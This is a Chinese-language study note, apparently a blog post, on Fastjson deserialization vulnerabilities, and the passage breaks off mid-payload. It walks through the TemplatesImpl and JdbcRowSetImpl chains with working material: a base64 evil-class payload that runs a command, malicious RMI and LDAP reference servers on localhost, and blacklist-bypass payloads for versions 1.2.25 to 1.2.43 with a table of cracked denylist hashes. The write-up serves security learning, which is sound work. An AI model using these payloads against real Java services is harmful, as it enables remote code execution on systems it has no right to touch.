# 写在前面
java进一步学习：
特别鸣谢：
[https://goodapple.top/archives/832](https://goodapple.top/archives/832)
[https://www.yuque.com/jinjinshigekeaigui/qskpi5/zuz3ad](https://www.yuque.com/jinjinshigekeaigui/qskpi5/zuz3ad)
[https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/](https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)  感谢boogipop师傅，他真的好细（没什么不对劲）。

准备项目：
[https://github.com/alibaba/fastjson](https://github.com/alibaba/fastjson)
下好后，把里面源码的com内容复制到项目源码里面就可以导入了。
# javajson简单使用：
```c
package org.example;

//一个简单的Java Bean
//使用Alt+Insert快捷键快速生成setter和getter

public class Person {
    public String name;
    public int age;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}

```
标准的javabean设置
```c
package org.example;

import com.alibaba.fastjson.JSON;

public class JSONtest {
    public static void main(String[] args) {
        //创建一个Java Bean对象
        Person person = new Person();
        person.setName("Faster");
        person.setAge(18);

        System.out.println("--------------序列化-------------");

        //将其序列化为JSON
        String JSON_Serialize = JSON.toJSONString(person);
        System.out.println(JSON_Serialize);

        System.out.println("-------------反序列化-------------");

        //使用parse方法，将JSON反序列化为一个JSONObject
        Object o1 =  JSON.parse(JSON_Serialize);
        System.out.println(o1.getClass().getName());
        System.out.println(o1);

        System.out.println("-------------反序列化-------------");

        //使用parseObject方法，将JSON反序列化为一个JSONObject
        Object o2 = JSON.parseObject(JSON_Serialize);
        System.out.println(o2.getClass().getName());
        System.out.println(o2);

        System.out.println("-------------反序列化-------------");

        //使用parseObject方法，并指定类，将JSON反序列化为一个指定的类对象
        Object o3 = JSON.parseObject(JSON_Serialize,Person.class);
        System.out.println(o3.getClass().getName());
        System.out.println(o3);
    }
}

```


```c
--------------序列化-------------
{"age":18,"name":"Faster"}
//当我们在使用Fastjson序列化对象的时候，
//如果toJSONString()方法不添加额外的属性，
//那么就会将一个Java Bean转换成JSON字符串
-------------反序列化-------------
com.alibaba.fastjson.JSONObject
{"name":"Faster","age":18}
//如果我们想把JSON字符串反序列化成Java Object，可以使用parse()方法。
//该方法默认将JSON字符串反序列化为一个JSONObject对象。
-------------反序列化-------------
com.alibaba.fastjson.JSONObject
{"name":"Faster","age":18}
-------------反序列化-------------
org.example.Person
org.example.Person@5d6f64b1

```
另外对于private不会进行序列化和反序列化。
在序列化时添加参数：
```c
String JSON_Serialize = JSON.toJSONString(person, SerializerFeature.WriteClassName);
```
序列化数据：
```c
{"@type":"org.example.Person","age":18,"name":"Faster"}
```

添加@type 属性，用于标记对象。
在反序列化该JSON字符串的时候，parse()方法就会根据@type标识将其转为原来的类。

然后就可以自己构造一个反序列化字符串：
```c
String JSON_Serialize = "{\"@type\":\"Person\",\"age\":18,\"name\":\"Faster\"}";
System.out.println(JSON.parse(JSON_Serialize));
 
//结果如下
Person@4459eb14
```
```c
{"@type":"Person","name":"Faster","age":18}
```

或者反序列化的时候，指定原型。
```c
bject o3 = JSON.parseObject(JSON_Serialize,Person.class);
System.out.println(o3.getClass().getName());
System.out.println(o3);
```
此时的o3是类person的原型Class。
toJSONString()方法实际是通过调用getter来获取对象的属性值的，进而根据这些属性值来生成JSON字符串。
parseObject()方法返回的是一个JSON Object对象，因为该方法实际上是调用parse()方法，然后调用toJSON()方法将返回值强转为JSON Object。
## 源码

```c
  key = lexer.scanSymbol(this.symbolTable, '"');
```
解析@符号
而后反射：
```c
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
                        ref = lexer.scanSymbol(this.symbolTable, '"');
                        Class<?> clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader());
```

```c
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Demo {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"yv66vgAAADQAOwoACQAqCgArACwIAC0KACsALgcALwcAMAoABgAxBwAyBwAzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAClMY29tL2V4YW1wbGUvZmFzdGpzb25fdG9zdHJpbmcvZXZpbGNsYXNzOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBABBNZXRob2RQYXJhbWV0ZXJzAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHADQBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAC8BAApTb3VyY2VGaWxlAQAOZXZpbGNsYXNzLmphdmEMAAoACwcANQwANgA3AQAEY2FsYwwAOAA5AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKADoBACdjb20vZXhhbXBsZS9mYXN0anNvbl90b3N0cmluZy9ldmlsY2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAAsADgAAAAwAAQAAAAUADwAQAAAACQARABIAAgAMAAAAKwAAAAEAAAABsQAAAAIADQAAAAYAAQAAABYADgAAAAwAAQAAAAEAEwAUAAAAFQAAAAUBABMAAAABABYAFwADAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAGwAOAAAAIAADAAAAAQAPABAAAAAAAAEAGAAZAAEAAAABABoAGwACABwAAAAEAAEAHQAVAAAACQIAGAAAABoAAAABABYAHgADAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAIAAOAAAAKgAEAAAAAQAPABAAAAAAAAEAGAAZAAEAAAABAB8AIAACAAAAAQAhACIAAwAcAAAABAABAB0AFQAAAA0DABgAAAAfAAAAIQAAAAgAIwALAAEADAAAAGYAAwABAAAAF7gAAhIDtgAEV6cADUu7AAZZKrcAB7+xAAEAAAAJAAwABQADAA0AAAAWAAUAAAAOAAkAEQAMAA8ADQAQABYAEgAOAAAADAABAA0ACQAkACUAAAAmAAAABwACTAcAJwkAAQAoAAAAAgAp\"], '_name':'c.c', '_tfactory':{ },\"_outputProperties\":{}, \"_name\":\"a\", \"_version\":\"1.0\", \"allowedProtocols\":\"all\"}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);
        //因为bytescodes等属性私有，需要加Feature.SupportNonPublicField
    }
}
```

生成base64
```c
package org.example;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.util.Base64;

public class Demo2 {
    public static void main(String[] args) {
        byte[] buffer = null;
        String filepath = "D://tmp/classes/evilclass.class";
        try {
            FileInputStream fis = new FileInputStream(filepath);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] b = new byte[1024];
            int n;
            while((n = fis.read(b))!=-1) {
                bos.write(b,0,n);
            }
            fis.close();
            bos.close();
            buffer = bos.toByteArray();
        }catch(Exception e) {
            e.printStackTrace();
        }
        Base64.Encoder encoder = Base64.getEncoder();
        String value = ((Base64.Encoder) encoder).encodeToString(buffer);
        System.out.println(value);

    }
}

```
断点给到JSON.parseobject
跟进JSON文件的paseObject方法：
```c
public static JSONObject parseObject(String text, Feature... features) {
        return (JSONObject) parse(text, features);
    }
```
继续跟进，实际上是个封装：
```c
public static Object parse(String text, Feature... features) {
        int featureValues = DEFAULT_PARSER_FEATURE;
        for (Feature feature : features) {
            featureValues = Feature.config(featureValues, feature, true);
        }

        return parse(text, featureValues);
    }
```
还是parse，继续进去
```c
public static Object parse(String text, int features) {
        if (text == null) {
            return null;
        }

        DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
        Object value = parser.parse();

        parser.handleResovleTask(value);

        parser.close();

        return value;
    }
```
defaultjsonpaeser的parse
```c
public Object parse() {
        return parse(null);
    }
```
先封装
跟进，进入case
```c
case LBRACE:
                JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
                return parseObject(object, fieldName);
```
跟进parseObject：
```c
if (ch == '"') {
                    key = lexer.scanSymbol(symbolTable, '"');//提取key，也就是@type
                    lexer.skipWhitespace();
                    ch = lexer.getCurrent();
```
然后加载恶意类
```c
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
                    String typeName = lexer.scanSymbol(symbolTable, '"');
                    Class<?> clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());
```
将恶意类放在map中返回：
```c
if (contextClassLoader != null) {
                clazz = contextClassLoader.loadClass(className);
                mappings.put(className, clazz);

                return clazz;
```
返回，
```c
    ObjectDeserializer deserializer = config.getDeserializer(clazz);
                    return deserializer.deserialze(this, clazz, fieldName);
```
进入parserconfig的getDeserializer：
```c
public ObjectDeserializer getDeserializer(Type type) {
        ObjectDeserializer derializer = this.derializers.get(type);
        if (derializer != null) {
            return derializer;
        }

        if (type instanceof Class<?>) {
            return getDeserializer((Class<?>) type, type);
        }
```
有个createJavaBeanDeserializer
```c
else if (Map.class.isAssignableFrom(clazz)) {
            derializer = MapDeserializer.instance;
        } else if (Throwable.class.isAssignableFrom(clazz)) {
            derializer = new ThrowableDeserializer(this, clazz);
        } else {
            derializer = createJavaBeanDeserializer(clazz, type);
        }
```
调用构造方法：
```c
if (!asmEnable) {
            return new JavaBeanDeserializer(this, clazz, type);
        }
```
```c
public JavaBeanDeserializer(ParserConfig config, Class<?> clazz, Type type){
        this(config, JavaBeanInfo.build(clazz, type, config.propertyNamingStrategy));
    }
```
进build：
```c
 for (Method method : methods) 
```
对方法进行遍历
找到了setbean，不跳出当次循环
```c
if (!methodName.startsWith("set")) { // TODO "set"的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？
                continue;
            }

            char c3 = methodName.charAt(3);
```
getbean：
```c
 propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
```
最后一步deserialize
跟进到一个封装的deserialize：
```c
boolean match = parseField(parser, key, object, type, fieldValues);
```
最后跟到：
```c
Map map = (Map) method.invoke(object);
```
触发弹计算器方法，这里是templateIML链。
# JdbcRowSetImpl利用链
准备好一个服务器
```c
package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMI_Server_Reference {
    void register() throws Exception{
        LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("evilref","evilref","http://127.0.0.1:8000/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
        Naming.bind("rmi://127.0.0.1:1099/hello",refObjWrapper);
        System.out.println("Registry运行中......");
    }

    public static void main(String[] args) throws Exception {
        new RMI_Server_Reference().register();
    }
}

```
记得本地恶意类python开个监听
然后客户端
```c
import com.alibaba.fastjson.JSON;

public class Fastjson_Jdbc_RMI {
    public static void main(String[] args) {
        String payload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/hello\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}
```
成功弹计算器。
分析，断点给parse
```c
public static Object parse(String text) {
        return parse(text, DEFAULT_PARSER_FEATURE);
    }
```
封装一个方法
```c
public static Object parse(String text, int features) {
        if (text == null) {
            return null;
        }

        DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
        Object value = parser.parse();
```
调用DefaultJSONParser的parse
```c
public Object parse() {
        return parse(null);
    }
```
又是封装，跟进：
```c
public Object parse(Object fieldName) {
        final JSONLexer lexer = this.lexer;
        switch (lexer.token()) {
            case SET:
                lexer.nextToken();
                HashSet<Object> set = new HashSet<Object>();
                parseArray(set, fieldName);
                return set;
            case TREE_SET:
                lexer.nextToken();
                TreeSet<Object> treeSet = new TreeSet<Object>();
                parseArray(treeSet, fieldName);
                return treeSet;
            case LBRACKET:
                JSONArray array = new JSONArray();
                parseArray(array, fieldName);
                if (lexer.isEnabled(Feature.UseObjectArray)) {
                    return array.toArray();
                }
                return array;
            case LBRACE:
                JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
                return parseObject(object, fieldName);
```
lexer在之前已经初始化，进入LBRACE，跟进parseObject
同样的提取key
```c
if (ch == '"') {
                    key = lexer.scanSymbol(symbolTable, '"');
                    lexer.skipWhitespace();
                    ch = lexer.getCurrent();
                    if (ch != ':') {
```
根据需要加载类
```c
Class<?> clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());
```
```c
ObjectDeserializer deserializer = config.getDeserializer(clazz);
                    return deserializer.deserialze(this, clazz, fieldName);
```
获取deserializer，然后反序列化。
LDAP的fastjson
```c
package LDAP;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LDAP_Server {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1:8000/#evilref"};
        int port = 9999;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}

```
```c
public class Fastjson_Jdbc_LDAP {
    public static void main(String[] args) {
        String payload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"ldap://127.0.0.1:9999/evilref\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}
```
只是改了下访问协议和url。
借用下师傅的调用栈分析：
```c
connect:627, JdbcRowSetImpl (com.sun.rowset)
setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:128, JSON (com.alibaba.fastjson)
main:10, Fastjson_Jdbc_LDAP
```
setDataSourceName函数
```c
public void setDataSourceName(String name) throws SQLException {

        if (name == null) {
            dataSource = null;
        } else if (name.equals("")) {
           throw new SQLException("DataSource name cannot be empty string");
        } else {
           dataSource = name;
        }
```
会给dataSource设置值
setAutoCommit会自动调用connect方法
connect有lookup，参数证号为dataSource，通过此，就可以访问恶意服务器。
# TemplatesImpl利用链
由于getoutputproperties能够走到_defineclaa类，并且命名格式符合bean的get，在反序列化过程中，就会被调用。
所以为outputpreperties赋值，对应就会有getbean和setbean，而getbean歪打正着地会调用templatesImpl链。
## 构造payload
```c
private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();
```
要求_name不为空且_class为空.
```c
private void defineTransletClasses()
        throws TransformerConfigurationException {

        if (_bytecodes == null) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });
        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];
            for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }
```
调用了_tfactory都方法，那么_tfactory不为空。
恶意类必须为AbstractTranslet的子类。
这样才能完整执行循环。
由于fastjson会将bytescode类型自动加密，于是要将bytescode进行base64加密。

payload：
```c
{
   
    \"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",
       \"outputproperties\":{},
        \"_tfactory\":{},
        \"_name\":\"a.b\",
        \"_bytecodes\":\"自己恶意类的base64\"
       
}
```
```c
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
import java.io.IOException;
 
public class Payload extends AbstractTranslet {
 
    public Payload() throws IOException{
        Runtime.getRuntime().exec("calc");
    }
 
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
 
    }
 
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
 
    }
 
    public static void main(String[] args) throws IOException {
        Payload payload = new Payload();
    }
}
```
恶意类写过多次了，不分析了。
# 高版本绕过
苦逼之旅开始了，似乎很难的样子。
## 1.2.25
设置了黑名单，
```c
Class<?> clazz = this.config.checkAutoType(ref, (Class)null);
```
阻止了任意类的加载：
```c
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
        if (typeName == null) {
            return null;
        } else {
            String className = typeName.replace('$', '.');
            if (this.autoTypeSupport || expectClass != null) {
                int i;
                String deny;
                for(i = 0; i < this.acceptList.length; ++i) {
                    deny = this.acceptList[i];
                    if (className.startsWith(deny)) {
                        return TypeUtils.loadClass(typeName, this.defaultClassLoader);
                    }
                }

                for(i = 0; i < this.denyList.length; ++i) {
                    deny = this.denyList[i];
                    if (className.startsWith(deny)) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }
                }
            }
```
这里默认autoTypeSupport的值为false，开启白名单机制，会报错，autotype is not support。
在我们的客户端添加以下内容：
```c
import com.alibaba.fastjson.parser.ParserConfig;

ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
ParserConfig.getGlobalInstance().addAccept("com.sun.rowset.JdbcRowSetImpl");
```
开启后，就能进入if，跟进Type Util.loadClass
```c
public static Class<?> loadClass(String className, ClassLoader classLoader) {
        if (className == null || className.length() == 0) {
            return null;
        }

        Class<?> clazz = mappings.get(className);

        if (clazz != null) {
            return clazz;
        }

        if (className.charAt(0) == '[') {
            Class<?> componentType = loadClass(className.substring(1), classLoader);
            return Array.newInstance(componentType, 0).getClass();
        }

        if (className.startsWith("L") && className.endsWith(";")) {
            String newClassName = className.substring(1, className.length() - 1);
            return loadClass(newClassName, classLoader);
        }
```
L开头,;结尾就会加载类
### 最後のpayload

```c
public class Fastjson_Jdbc_LDAP {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        ParserConfig.getGlobalInstance().addAccept("com.sun.rowset.JdbcRowSetImpl");
        String payload = "{" +
                "\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\"," +
                "\"dataSourceName\":\"ldap://127.0.0.1:9999/evilref\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}
```
成功弹计算器。

## 1.2.42
主要有两点：
黑名单改为了hash值，防止绕过
对于传入的类名，删除开头L和结尾的;
师傅破译的哈希表
```c
1.2.42	-8720046426850100497	0x86fc2bf9beaf7aefL	org.apache.commons.collections4.comparators
1.2.42	-8109300701639721088	0x8f75f9fa0df03f80L	org.python.core
1.2.42	-7966123100503199569	0x9172a53f157930afL	org.apache.tomcat
1.2.42	-7766605818834748097	0x9437792831df7d3fL	org.apache.xalan
1.2.42	-6835437086156813536	0xa123a62f93178b20L	javax.xml
1.2.42	-4837536971810737970	0xbcdd9dc12766f0ceL	org.springframework.
1.2.42	-4082057040235125754	0xc7599ebfe3e72406L	org.apache.commons.beanutils
1.2.42	-2364987994247679115	0xdf2ddff310cdb375L	org.apache.commons.collections.Transformer
1.2.42	-1872417015366588117	0xe603d6a51fad692bL	org.codehaus.groovy.runtime
1.2.42	-254670111376247151	0xfc773ae20c827691L	java.lang.Thread
1.2.42	-190281065685395680	0xfd5bfc610056d720L	javax.net.
1.2.42	313864100207897507	0x45b11bc78a3aba3L	com.mchange
1.2.42	1203232727967308606	0x10b2bdca849d9b3eL	org.apache.wicket.util
1.2.42	1502845958873959152	0x14db2e6fead04af0L	java.util.jar.
1.2.42	3547627781654598988	0x313bb4abd8d4554cL	org.mozilla.javascript
1.2.42	3730752432285826863	0x33c64b921f523f2fL	java.rmi
1.2.42	3794316665763266033	0x34a81ee78429fdf1L	java.util.prefs.
1.2.42	4147696707147271408	0x398f942e01920cf0L	com.sun.
1.2.42	5347909877633654828	0x4a3797b30328202cL	java.util.logging.
1.2.42	5450448828334921485	0x4ba3e254e758d70dL	org.apache.bcel
1.2.42	5751393439502795295	0x4fd10ddc6d13821fL	java.net.Socket
1.2.42	5944107969236155580	0x527db6b46ce3bcbcL	org.apache.commons.fileupload
1.2.42	6742705432718011780	0x5d92e6ddde40ed84L	org.jboss
1.2.42	7179336928365889465	0x63a220e60a17c7b9L	org.hibernate
1.2.42	7442624256860549330	0x6749835432e0f0d2L	org.apache.commons.collections.functors
1.2.42	8838294710098435315	0x7aa7ee3627a19cf3L	org.apache.myfaces.context.servlet
```
```c
if ((((BASIC
                ^ className.charAt(0))
                * PRIME)
                ^ className.charAt(className.length() - 1))
                * PRIME == 0x9198507b5af98f0L)
        {
            className = className.substring(1, className.length() - 1);
        }
```
删除l和;的话，双写就行了，绕过sql一样的道理。
### payload
```c
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.parser.*;
public class Fastjson_Jdbc_LDAP {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        ParserConfig.getGlobalInstance().addAccept("com.sun.rowset.JdbcRowSetImpl");
        String payload = "{" +
                "\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\"," +
                "\"dataSourceName\":\"ldap://127.0.0.1:9999/evilref\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}
```
## 1.2.43
对于LL开头直接报错：
```c
if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
```
修改payload：
```c
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Demo {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"[{, 